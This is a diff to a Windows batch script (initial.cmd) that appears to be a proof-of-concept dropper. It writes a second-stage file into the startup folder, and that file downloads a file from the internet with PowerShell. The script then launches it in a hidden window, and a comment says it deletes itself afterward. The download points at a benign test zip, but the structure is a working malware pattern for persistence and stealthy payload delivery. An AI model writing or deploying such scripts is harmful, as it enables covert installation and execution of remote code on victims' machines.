@@ -11,7 +11,12 @@ set "THIS_FILE_NAME=initial.cmd"
 cd %STARTUP_PATH%
 
 @REM write pyloads to startup
-(echo MsgBox "Line 1" ^& vbCrlf ^& "lin 2", 262192, "Title")> popus.vbs
+(
+    echo powershell -c "Invoke-WebRequest -Uri 'http://ipv4.download.thinkbroadband.com/5MB.zip' -OutFile 'poc.zip'"
+)> stage2.cmd
+
+@REM run a payload
+powershell Start-Process powershell.exe -windowstyle hidden "stage2.cmd"
 
 @REM go back and delete ourselves
 cd %INITIAL_PATH%
